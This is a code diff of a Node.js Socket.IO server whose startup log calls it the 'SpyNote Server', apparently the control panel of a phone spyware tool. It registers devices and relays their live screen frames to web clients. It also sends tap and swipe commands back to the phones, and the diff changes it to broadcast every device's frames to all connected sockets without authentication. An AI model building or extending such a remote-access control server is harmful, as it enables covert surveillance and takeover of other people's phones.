@@ -1,11 +1,11 @@
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
-const path = require('path');
 const compression = require('compression');
 
 const app = express();
 const server = http.createServer(app);
+
 const io = socketIo(server, {
     cors: {
         origin: "*",
@@ -19,16 +19,31 @@ app.use(compression());
 app.use(express.static('public'));
 app.use(express.json());
 
-// Store connected devices
+// ===============================
+// DEVICE STORE
+// ===============================
 const devices = new Map();
 
+// ===============================
+// REST API
+// ===============================
 app.post('/register', (req, res) => {
     const { deviceId, model, brand, version, status } = req.body;
+
     if (deviceId) {
-        devices.set(deviceId, { model, brand, version, status, connected: true });
-        console.log("Device registered:", deviceId);
+        devices.set(deviceId, {
+            deviceId,
+            model,
+            brand,
+            version,
+            status: status || 'active',
+            connected: true
+        });
+
+        console.log("📱 Device registered:", deviceId);
         io.emit('devices-update', Array.from(devices.entries()));
     }
+
     res.json({ success: true });
 });
 
@@ -36,53 +51,86 @@ app.get('/devices', (req, res) => {
     res.json(Array.from(devices.entries()));
 });
 
-// Socket.IO Connection
+// ===============================
+// SOCKET.IO
+// ===============================
 io.on('connection', (socket) => {
-    console.log('New connection:', socket.id);
+    console.log('🔌 New socket:', socket.id);
 
+    /* ---------- DEVICE REGISTER ---------- */
     socket.on('register-device', (deviceInfo) => {
+        if (!deviceInfo || !deviceInfo.deviceId) return;
+
         const deviceId = deviceInfo.deviceId;
-        if (deviceId) {
-            devices.set(deviceId, { 
-                ...deviceInfo, 
-                connected: true,
-                socketId: socket.id 
-            });
-            socket.join(deviceId);
-            console.log("Device connected:", deviceId);
-            io.emit('devices-update', Array.from(devices.entries()));
-        }
+
+        devices.set(deviceId, {
+            ...deviceInfo,
+            connected: true,
+            socketId: socket.id
+        });
+
+        socket.join(deviceId);
+
+        console.log('✅ Device connected:', deviceId);
+        io.emit('devices-update', Array.from(devices.entries()));
     });
 
+    /* ---------- RECEIVE SCREEN FRAME ---------- */
     socket.on('screen-frame', (data) => {
-        const deviceId = data.deviceId;
-        if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('screen-update', data);
-        }
-    });
+        if (!data || !data.deviceId) return;
 
-    // Control commands
-    socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
-        if (devices.has(deviceId)) {
-            socket.to(deviceId).emit('control', {
-                action,
-                x: parseFloat(x) || 0,
-                y: parseFloat(y) || 0,
-                startX: parseFloat(startX) || 0,
-                startY: parseFloat(startY) || 0,
-                endX: parseFloat(endX) || 0,
-                endY: parseFloat(endY) || 0
+        console.log(
+            `📱 Frame received from ${data.deviceId}: ${data.width}x${data.height}`
+        );
+
+        try {
+            // ✅ SEND TO ALL WEB CLIENTS
+            io.emit('screen-frame', {
+                deviceId: data.deviceId,
+                data: data.data,
+                width: data.width,
+                height: data.height,
+                timestamp: data.timestamp
             });
+
+            // ✅ ALSO SEND TO DEVICE ROOM (OPTIONAL)
+            socket.to(data.deviceId).emit('screen-frame', data);
+
+        } catch (e) {
+            console.error('❌ Frame send error:', e);
         }
     });
 
+    /* ---------- CONTROL COMMANDS FROM WEB ---------- */
+    socket.on('control', (data) => {
+        const { deviceId } = data;
+        if (!deviceId || !devices.has(deviceId)) return;
+
+        console.log('🎮 Control:', data.action, '→', deviceId);
+
+        socket.to(deviceId).emit('control', {
+            action: data.action,
+            x: Number(data.x) || 0,
+            y: Number(data.y) || 0,
+            startX: Number(data.startX) || 0,
+            startY: Number(data.startY) || 0,
+            endX: Number(data.endX) || 0,
+            endY: Number(data.endY) || 0
+        });
+    });
+
+    /* ---------- DISCONNECT ---------- */
     socket.on('disconnect', () => {
-        console.log('Disconnected:', socket.id);
-        // Mark device as disconnected
-        for (let [deviceId, info] of devices.entries()) {
+        console.log('❌ Disconnected:', socket.id);
+
+        for (const [deviceId, info] of devices.entries()) {
             if (info.socketId === socket.id) {
-                devices.set(deviceId, { ...info, connected: false });
+                devices.set(deviceId, {
+                    ...info,
+                    connected: false
+                });
+
+                console.log('⚠️ Device offline:', deviceId);
                 io.emit('devices-update', Array.from(devices.entries()));
                 break;
             }
@@ -90,8 +138,12 @@ io.on('connection', (socket) => {
     });
 });
 
+// ===============================
+// START SERVER
+// ===============================
 const PORT = process.env.PORT || 3000;
+
 server.listen(PORT, () => {
-    console.log(`SpyNote Server running on port ${PORT}`);
-    console.log(`Web panel: http://localhost:${PORT}`);
+    console.log(`🚀 SpyNote Server running on port ${PORT}`);
+    console.log(`🌐 Web panel: http://localhost:${PORT}`);
 });
